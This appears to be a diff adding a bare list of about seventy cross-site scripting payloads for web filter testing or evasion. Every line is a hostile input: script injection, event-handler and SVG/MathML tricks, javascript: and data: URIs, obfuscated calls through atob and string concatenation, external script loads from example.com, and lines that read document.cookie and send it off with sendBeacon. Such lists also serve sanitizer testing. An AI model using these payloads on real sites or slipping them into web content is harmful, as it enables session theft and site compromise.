@@ -1,0 +1,71 @@
+<script src=//example.com></script>
+<script src=https://example.com/x.js></script>
+<script>setTimeout(alert,1)</script>
+<script>setInterval(alert,1)</script>
+<script>location='javascript:alert(1)'</script>
+<script>top['al'+'ert'](1)</script>
+<script>self['al'+'ert'](1)</script>
+<script>window['alert'](1)</script>
+<script>Function('alert(1)')()</script>
+<script>eval('alert(1)')</script>
+<script>(()=>alert(1))()</script>
+<script>(alert)(1)</script>
+<script>alert?.(1)</script>
+<script>window[atob('YWxlcnQ=')](1)</script>
+<script>new Function('alert(1)')()</script>
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><set onbegin=alert(1) attributeName=x to=1>
+<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+<math><mtext><img src=x onerror=alert(1)></mtext></math>
+<math href="javascript:alert(1)">CLICK</math>
+<math><mi xlink:href="data:x,<script>alert(1)</script>">
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc='<img src=x onerror=alert(1)>'></iframe>
+<iframe src=data:text/html,<script>alert(1)</script>></iframe>
+<object data=data:text/html,<script>alert(1)</script>></object>
+<embed src=data:text/html,<script>alert(1)</script>>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<base href="javascript:alert(1);//">
+<link rel=stylesheet href=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>X</button></form>
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<img src=x oneonerrorrror=alert(1) onerror=alert(1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=Function('alert(1)')()>
+<img src=x onerror=eval('alert(1)')>
+<img src=x onerror=alert`1`>
+<img src=x onerror=(alert)(1)>
+<img src=x onerror=(()=>alert(1))()>
+<img src=x onerror=location='javascript:alert(1)'>
+<img src=x onerror=alert(document.cookie)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=fetch('/').then(r=>alert(1))>
+<img src=x onerror=navigator.sendBeacon('/x',document.cookie)>
+<div onwheel=alert(1)>x</div>
+<div oncontextmenu=alert(1)>x</div>
+<div onpointerover=alert(1)>x</div>
+<div onpointerenter=alert(1)>x</div>
+<div onpointerdown=alert(1)>x</div>
+<div onpointerup=alert(1)>x</div>
+<div ondrag=alert(1)>x</div>
+<div ondragstart=alert(1)>x</div>
+<div ondrop=alert(1)>x</div>
+<div oncopy=alert(1)>x</div>
+<div oncut=alert(1)>x</div>
+<div onpaste=alert(1)>x</div>
+<img src=x onabort=alert(1)>
+<img src=x onbeforeload=alert(1)>
+<isindex type=image src=1 onerror=alert(1)>
+<xss id=x onmouseover=alert(1)>x</xss>
+<custom-tag onmouseover=alert(1)>x</custom-tag>
+<plaintext><script>alert(1)</script>
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+</xmp><img src=x onerror=alert(1)>
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
